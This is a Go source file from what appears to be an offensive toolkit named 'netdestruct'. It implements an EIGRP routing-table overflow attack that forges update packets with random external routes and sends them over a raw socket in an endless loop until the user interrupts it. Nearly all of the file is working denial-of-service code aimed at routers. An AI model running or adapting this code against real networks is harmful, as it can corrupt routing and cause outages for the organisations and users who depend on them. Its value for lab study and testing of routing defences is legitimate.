package eigrp

import (
	"crypto/rand"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"

	"netdestruct/libs/dos/routing"
)

const overflowDefaultPrefix = 24

// Overflow floods a router EIGRP table with random external routes.
type Overflow struct {
	Interface string
	AS        uint32
	SourceIP  string
	Target    string // optional: constrain random routes to this range/CIDR
}

func (o *Overflow) Run() error {
	iface, err := net.InterfaceByName(o.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", o.Interface, err)
	}
	src := net.ParseIP(o.SourceIP)
	if src == nil || src.To4() == nil {
		return fmt.Errorf("invalid IPv4 --src %q", o.SourceIP)
	}
	src4 := src.To4()

	var pool []routing.Route
	if o.Target != "" {
		pool, err = routing.ExpandTargets(o.Target)
		if err != nil {
			return err
		}
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", o.Interface)
	}

	var total int64
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total updates sent: %d\n", eigrpTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	if o.Target != "" {
		fmt.Printf("%s Beginning routing table overflow on %s (AS %d, src %s, pool %d routes)\n",
			eigrpTag, o.Interface, o.AS, src4, len(pool))
	} else {
		fmt.Printf("%s Beginning routing table overflow on %s (AS %d, src %s, random /%d)\n",
			eigrpTag, o.Interface, o.AS, src4, overflowDefaultPrefix)
	}
	fmt.Printf("%s Press Ctrl+C to stop.\n", eigrpTag)

	for {
		dst, prefixLen := randomRoute(pool)
		payload := buildIPv4Update(o.AS, src4, dst, prefixLen, 0)
		frame := buildIPv4Frame(srcMAC, src4, payload, 64)
		if err := sock.Send(frame); err != nil {
			return fmt.Errorf("send: %w", err)
		}
		atomic.AddInt64(&total, 1)
	}
}

func randomRoute(pool []routing.Route) (net.IP, int) {
	if len(pool) == 0 {
		return randIPv4(), overflowDefaultPrefix
	}
	idx := randInt(len(pool))
	r := pool[idx]
	if v4 := r.Addr.To4(); v4 != nil {
		if r.PrefixLen >= 32 {
			return v4, 32
		}
		return randomHostInRoute(r), r.PrefixLen
	}
	return randIPv4(), overflowDefaultPrefix
}

func randomHostInRoute(r routing.Route) net.IP {
	v4 := r.Addr.To4()
	if v4 == nil {
		return randIPv4()
	}
	if r.PrefixLen <= 0 || r.PrefixLen >= 32 {
		return v4
	}
	hostBits := 32 - r.PrefixLen
	network := routing.IPv4ToUint32(v4) & (^uint32(0) << uint(hostBits))
	hostMax := uint32(1)<<uint(hostBits) - 1
	if hostMax == 0 {
		return v4
	}
	offset := uint32(randInt(int(hostMax)))
	return routing.Uint32ToIPv4(network + offset)
}

func randIPv4() net.IP {
	var b [4]byte
	_, _ = rand.Read(b[:])
	return net.IP(b[:])
}

func randInt(n int) int {
	if n <= 1 {
		return 0
	}
	var b [4]byte
	_, _ = rand.Read(b[:])
	return int(uint32(b[0])<<24|uint32(b[1])<<16|uint32(b[2])<<8|uint32(b[3])) % n
}
